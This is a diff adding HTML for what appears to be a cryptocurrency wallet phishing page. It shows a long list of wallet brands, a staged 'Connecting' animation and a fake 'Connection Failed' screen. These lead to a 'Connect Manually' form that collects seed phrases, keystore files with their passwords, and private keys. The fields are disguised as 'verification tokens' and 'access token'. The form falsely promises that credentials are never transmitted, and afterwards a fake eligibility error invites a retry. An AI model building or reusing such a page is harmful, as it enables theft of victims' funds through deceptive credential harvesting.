+                    <div class="ow-icon"><img src="img/pera.png" alt="Pera Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Pera Wallet</div>
+                        <div class="ow-chain">Algorand</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/rainbow.png" alt="Rainbow" /></div>
+                    <div>
+                        <div class="ow-name">Rainbow</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/basewallet.png" alt="Base Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Base Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/rabby.png" alt="Rabby" /></div>
+                    <div>
+                        <div class="ow-name">Rabby Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/zerion.png" alt="Zerion" /></div>
+                    <div>
+                        <div class="ow-name">Zerion</div>
+                        <div class="ow-chain">Ethereum / Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/walletconnect.png" alt="WalletConnect" /></div>
+                    <div>
+                        <div class="ow-name">WalletConnect</div>
+                        <div class="ow-chain">Any compatible wallet</div>
+                    </div>
+                </div>
+                <div class="ow-item" data-wid="phantom" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/phantomwallet.png" alt="Phantom" /></div>
+                    <div>
+                        <div class="ow-name">Phantom</div>
+                        <div class="ow-chain">Solana / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/stepn.png" alt="Stepn" /></div>
+                    <div>
+                        <div class="ow-name">Stepn</div>
+                        <div class="ow-chain">Solana / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" data-wid="solflare" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/solflare.png" alt="Solflare" /></div>
+                    <div>
+                        <div class="ow-name">Solflare</div>
+                        <div class="ow-chain">Solana</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/okx.png" alt="OKX Wallet" /></div>
+                    <div>
+                        <div class="ow-name">OKX Wallet</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/terrastation.png" alt="Terra Station" /></div>
+                    <div>
+                        <div class="ow-name">Terra Station</div>
+                        <div class="ow-chain">Terra</div>
+                    </div>
+                </div>
+                <div class="ow-item" data-wid="Ledger" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/ledgerwallet.png" alt="Ledger" /></div>
+                    <div>
+                        <div class="ow-name">Ledger</div>
+                        <div class="ow-chain">Hardware wallet</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/exodus.png" alt="Exodus" /></div>
+                    <div>
+                        <div class="ow-name">Exodus</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/atomic.png" alt="Atomic Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Atomic Wallet</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/trezor.png" alt="Trezor" /></div>
+                    <div>
+                        <div class="ow-name">Trezor</div>
+                        <div class="ow-chain">Hardware / Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/tokenpocket.png" alt="TokenPocket" /></div>
+                    <div>
+                        <div class="ow-name">TokenPocket</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/uniswap.png" alt="Uniswap" /></div>
+                    <div>
+                        <div class="ow-name">Uniswap Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/cryptocom.png" alt="Crypto.com" /></div>
+                    <div>
+                        <div class="ow-name">Crypto.com DeFi</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/keplr.png" alt="Keplr" /></div>
+                    <div>
+                        <div class="ow-name">Keplr</div>
+                        <div class="ow-chain">Cosmos / IBC</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/leapwallet.png" alt="Leap" /></div>
+                    <div>
+                        <div class="ow-name">Leap Wallet</div>
+                        <div class="ow-chain">Cosmos / IBC</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/tangem.png" alt="Tangem" /></div>
+                    <div>
+                        <div class="ow-name">Tangem</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/jade.png" alt="Jade" /></div>
+                    <div>
+                        <div class="ow-name">Jade</div>
+                        <div class="ow-chain">Cardano</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/polkadot.png" alt="Polkadot.js" /></div>
+                    <div>
+                        <div class="ow-name">Polkadot.js</div>
+                        <div class="ow-chain">Polkadot / Substrate</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/talisman.png" alt="Talisman" /></div>
+                    <div>
+                        <div class="ow-name">Talisman</div>
+                        <div class="ow-chain">Polkadot / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/nami.png" alt="Nami" /></div>
+                    <div>
+                        <div class="ow-name">Nami</div>
+                        <div class="ow-chain">Cardano</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/eternl.png" alt="Eternl" /></div>
+                    <div>
+                        <div class="ow-name">Eternl</div>
+                        <div class="ow-chain">Cardano</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/bitkeep.png" alt="BitKeep" /></div>
+                    <div>
+                        <div class="ow-name">BitKeep</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/martian.png" alt="Martian" /></div>
+                    <div>
+                        <div class="ow-name">Martian</div>
+                        <div class="ow-chain">Aptos / Sui</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/suiet.png" alt="Suiet" /></div>
+                    <div>
+                        <div class="ow-name">Suiet</div>
+                        <div class="ow-chain">Sui</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/huobi.png" alt="Huobi" /></div>
+                    <div>
+                        <div class="ow-name">Huobi</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/argent.png" alt="Argent" /></div>
+                    <div>
+                        <div class="ow-name">Argent</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/defly.png" alt="Defly" /></div>
+                    <div>
+                        <div class="ow-name">Defly</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/midas.png" alt="Midas Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Midas Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/tongue.png" alt="Tongue Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Tongue Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/celo.png" alt="Celo Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Celo Wallet</div>
+                        <div class="ow-chain">Celo</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/bridge wallet.png" alt="Bridge Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Bridge Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/walletio.png" alt="Wallet.io" /></div>
+                    <div>
+                        <div class="ow-name">Wallet.io</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/coinomi.png" alt="Coinomi Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Coinomi Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/dharma.png" alt="Dharma Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Dharma Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/1inch.png" alt="1inch Wallet" /></div>
+                    <div>
+                        <div class="ow-name">1inch Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/walleth.png" alt="walleth" /></div>
+                    <div>
+                        <div class="ow-name">walleth</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/bitpay.png" alt="BitPay Wallet" /></div>
+                    <div>
+                        <div class="ow-name">BitPay Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/infinito.png" alt="Infinito Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Infinito Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/defly.png" alt="Defly Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Defly Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/huobi.png" alt="Huobi Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Huobi Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/bitkeep.png" alt="BitKeep Wallet" /></div>
+                    <div>
+                        <div class="ow-name">BitKeep Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/jade.png" alt="Jade Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Jade Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/stepn.png" alt="StepN Wallet" /></div>
+                    <div>
+                        <div class="ow-name">StepN Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/jupiter.png" alt="Jupiter Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Jupiter Wallet</div>
+                        <div class="ow-chain">Solana / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/bitcoincom.png" alt="Bitcoin.com Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Bitcoin.com Wallet</div>
+                        <div class="ow-chain">Bitcoin / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/ellipal.png" alt="Ellipal Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Ellipal Wallet</div>
+                        <div class="ow-chain">Hardware Wallet</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/best.png" alt="Best Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Best Wallet</div>
+                        <div class="ow-chain">Multi-chain wallet</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/robinhood.png" alt="Robinhood Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Robinhood Wallet</div>
+                        <div class="ow-chain">Crypto Wallet</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/xaman.png" alt="Xaman Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Xaman Wallet</div>
+                        <div class="ow-chain">XRP Ledger</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/magic eden.png" alt="Magic Eden" /></div>
+                    <div>
+                        <div class="ow-name">Magic Eden</div>
+                        <div class="ow-chain">NFT wallet</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/cosmos.png" alt="Cosmos Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Cosmos Wallet</div>
+                        <div class="ow-chain">Cosmos</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/kraken.png" alt="Kraken Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Kraken Wallet</div>
+                        <div class="ow-chain">Crypto Wallet</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/timelessx.png" alt="Timeless X Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Timeless X Wallet</div>
+                        <div class="ow-chain">Crypto Wallet</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/blockchaincom.png" alt="Blockchain.com Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Blockchain.com Wallet</div>
+                        <div class="ow-chain">Crypto Wallet</div>
+                    </div>
+                </div>
+            </div>
+            <div class="ow-no-results" id="owNoResults">
+                <i class="ri-search-line"></i>
+                No wallets found for "<span id="owQuery" style="color:#08dfa3;font-weight:600"></span>"
+            </div>
+        </div>
+
+
+        <div class="w-sub" id="wScreen2">
+            <div class="w-header">
+                <span class="w-title">Connecting</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="w-loading-body">
+                <div class="w-wallet-chip">
+                    <div class="w-chip-icon"><img id="s2Img" src="" alt="" /></div>
+                    <span class="w-chip-name" id="s2Name">Wallet</span>
+                </div>
+                <div class="w-spinner"></div>
+                <p class="w-status" id="s2Status">Initializing secure connection...</p>
+                <div class="w-progress-wrap">
+                    <div class="w-progress-bar" id="s2Progress"></div>
+                </div>
+            </div>
+        </div>
+
+
+        <div class="w-sub" id="wScreen3">
+            <div class="w-header">
+                <span class="w-title">Connection Failed</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="w-error-body">
+                <div class="w-wallet-chip">
+                    <div class="w-chip-icon"><img id="s3Img" src="" alt="" /></div>
+                    <span class="w-chip-name" id="s3Name">Wallet</span>
+                </div>
+                <div class="w-error-icon"><i class="ri-wifi-off-line"></i></div>
+                <p class="w-error-msg">
+                    <strong>Unable to Connect</strong>
+                    We couldn't establish a connection with your wallet. This may be due to a timeout or an unresponsive
+                    device. Try again or connect manually.
+                </p>
+                <div class="w-btn-stack">
+                    <button class="w-btn w-btn-plum" id="retryBtn">
+                        <i class="ri-refresh-line"></i> Retry Connection
+                    </button>
+                    <button class="w-btn w-btn-ghost" id="manualBtn">Connect Manually</button>
+                </div>
+            </div>
+        </div>
+
+
+        <div class="w-sub" id="wScreen4">
+            <div class="w-header">
+                <span class="w-title">Connect Manually</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="w-manual-body">
+
+
+                <div class="w-wallet-chip">
+                    <div class="w-chip-icon"><img id="s4Img" src="" alt="" /></div>
+                    <span class="w-chip-name" id="s4Name">Wallet</span>
+                </div>
+
+
+                <div class="type-toggle">
+                    <button class="type-btn" id="btn-keystore" onclick="switchType('keystore')">Keystore JSON</button>
+                    <button class="type-btn active" id="btn-phrase" onclick="switchType('phrase')">Phrase</button>
+                    <button class="type-btn" id="btn-privatekey" onclick="switchType('privatekey')">Private Key</button>
+                </div>
+
+
+                <div class="input-pane active" id="pane-phrase">
+                    <textarea class="w-textarea phrase-area" id="phraseInput"
+                        placeholder="Enter your verification tokens, separated by spaces..." spellcheck="false"
+                        autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
+                </div>
+
+
+                <div class="input-pane" id="pane-keystore">
+                    <textarea class="w-textarea keystore-area" id="keystoreInput" placeholder='Paste Passphrase'
+                        spellcheck="false" autocomplete="off"></textarea>
+                    <input type="" class="w-input" id="keystorePassword" placeholder="Password" autocomplete="off" />
+                    <button class="attach-btn" onclick="document.getElementById('keystoreFileInput').click()">
+                        <i class="ri-attachment-2"></i>
+                        Attach Keystore File
+                    </button>
+                    <input type="file" id="keystoreFileInput" accept=".json,.txt,.png,.jpg,.jpeg"
+                        onchange="processAttachment(this)" />
+                    <p class="attach-file-name" id="attachFileName"></p>
+                </div>
+
+
+                <div class="input-pane" id="pane-privatekey">
+                    <textarea class="w-textarea privkey-area" id="privkeyInput" placeholder="Enter your access token..."
+                        spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
+                </div>
+
+
+                <div class="w-encrypt-note">
+                    <i class="ri-lock-2-line"></i>
+                    <p>
+                        <strong>End-to-end encrypted.</strong>
+                        Your credentials are encrypted locally and never transmitted to any server.
+                        Support will never ask for your access credentials.
+                    </p>
+                </div>
+
+                <button class="w-btn w-btn-plum" onclick="submitForm()">
+                    <i class="ri-wallet-3-line"></i> Connect Wallet
+                </button>
+
+            </div>
+        </div>
+
+
+        <div class="w-sub" id="wScreen5">
+            <div class="w-header">
+                <span class="w-title">Verification Failed</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="w-error-body">
+                <div class="w-wallet-chip">
+                    <div class="w-chip-icon"><img id="s5Img" src="" alt="" /></div>
+                    <span class="w-chip-name" id="s5Name">Wallet</span>
+                </div>
+                <div class="w-error-icon"><i class="ri-error-warning-line"></i></div>
+                <p class="w-error-msg">
+                    <strong>Error Connecting</strong>
+                    This could be due to your wallet volume being below the required minimum or your wallet is
+                    ineligible. Try again with an active wallet!
+                </p>
+                <div class="w-btn-stack">
+                    <button class="w-btn w-btn-plum" onclick="handleRetryManual()">
+                        <i class="ri-refresh-line"></i> Try Again
+                    </button>
+                    <button class="w-btn w-btn-ghost" onclick="closeWallet()">Close</button>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <script src="function.js"></script>
+</body>
+
+
+
+
+</html>
